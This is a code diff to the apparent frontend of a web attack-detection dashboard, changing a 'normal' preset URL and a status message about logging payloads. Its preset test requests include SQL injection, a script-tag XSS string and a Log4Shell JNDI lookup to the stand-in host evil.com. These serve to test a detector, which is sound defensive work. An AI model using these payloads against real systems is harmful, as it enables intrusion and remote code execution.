@@ -118,7 +118,7 @@ const PRESETS = {
     sqli: "http://localhost:8080/login?user=admin' OR 1=1 --&pwd=x HTTP/1.1",
     xss: "http://localhost:8080/search?q=<script>alert('XSS')</script> HTTP/1.1",
     log4j: "http://localhost:8080/api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1",
-    normal: "http://localhost:8080/tienda1/index.jsp HTTP/1.1"
+    normal: "http://localhost:8080/tienda1/imagenes/nuevo_logo.png"
 };
 
 function sendPreset(type) {
@@ -155,7 +155,7 @@ async function sendTestPayload() {
             Prediction: <strong>${data.prediction}</strong> &nbsp;|&nbsp; 
             Confidence: <strong>${data.confidence}%</strong> &nbsp;|&nbsp;
             Latency: <strong>${data.latency_ms}ms</strong><br>
-            <span style="opacity:0.7">Payload logged to shadow database for self-healing analysis.</span>
+            <span style="opacity:0.7">Payload logged to shadow database${data.quarantine_status ? `; feedback queued as ${data.quarantine_status}` : ''}.</span>
         `;
 
         // Refresh data immediately
